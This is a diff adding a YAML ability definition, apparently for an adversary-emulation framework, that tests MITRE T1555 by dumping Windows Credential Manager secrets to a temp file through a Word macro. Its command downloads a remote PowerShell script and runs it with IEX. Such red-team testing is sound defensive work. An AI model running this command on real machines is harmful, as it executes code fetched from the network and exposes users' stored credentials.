@@ -1,0 +1,24 @@
+- description: 'This module will extract the credentials found within the Windows
+    credential manager and dump
+
+    them to $env:TEMP\windows-credentials.txt
+
+    '
+  id: 935e8026-584b-8519-2519-c57d7080b048
+  name: Extract Windows Credential Manager via VBA
+  platforms:
+    windows:
+      psh:
+        cleanup: Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt"
+          -officeProduct "Word" -sub "Extract"'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
